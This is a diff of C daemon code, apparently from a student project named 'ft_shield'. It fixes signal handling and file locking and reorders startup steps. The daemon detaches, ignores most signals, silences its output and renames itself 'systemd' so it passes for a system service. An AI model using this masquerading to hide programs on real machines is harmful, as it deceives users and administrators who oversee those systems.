@@ -17,19 +17,18 @@ void reset_signals() {
     sigemptyset(&empty);
     sigprocmask(SIG_SETMASK, &empty, NULL);
     for (int sig = 1; sig < _NSIG; sig++) { // Ignorer certains signaux
-        if (sig && SIGKILL && sig != SIGSTOP && sig != SIGPIPE)
+        if (sig != SIGKILL && sig != SIGSTOP && sig != SIGPIPE)
             signal(sig, SIG_IGN);
     }
 }
 
 void handle_lock(int mod) {
-    const char *lock_file = "/var/run/lock/ft_shield.lock";
+    const char *lock_file = "/tmp/ft_shield.lock";
     int fd = sc(SYS_open, lock_file, O_CREAT | O_RDWR, 0644);
 
     if (mod == LOCK) {
-        if (sc(SYS_flock, fd, LOCK_EX) == -1) {
+        if (sc(SYS_flock, fd, LOCK_EX | LOCK_NB) == -1) {
             sc(SYS_close, fd);
-            printf("ça rentre là?\n");
             exit(EXIT_FAILURE);
         }
     } else {
@@ -57,9 +56,9 @@ void create_daemon() {
     if (pid > 0)
         exit(EXIT_SUCCESS);
         
-    handle_lock(LOCK);
     close_fds();
     reset_signals();
+    handle_lock(LOCK);
     sc(SYS_prctl, PR_SET_NAME, "systemd\0", NULL, NULL, NULL);
     sc(SYS_umask, 0);
     sc(SYS_chdir, "/");
@@ -67,8 +66,8 @@ void create_daemon() {
     if (fd < 0)
         exit(EXIT_FAILURE);
     // redirection des flux standards vers /dev/null
+    // int log_fd = open("/tmp/daemon.log", O_WRONLY | O_CREAT | O_APPEND, 0644);
     sc(SYS_dup2, fd, STDIN_FILENO);
     sc(SYS_dup2, fd, STDOUT_FILENO);
     sc(SYS_dup2, fd, STDERR_FILENO);
-    
 }
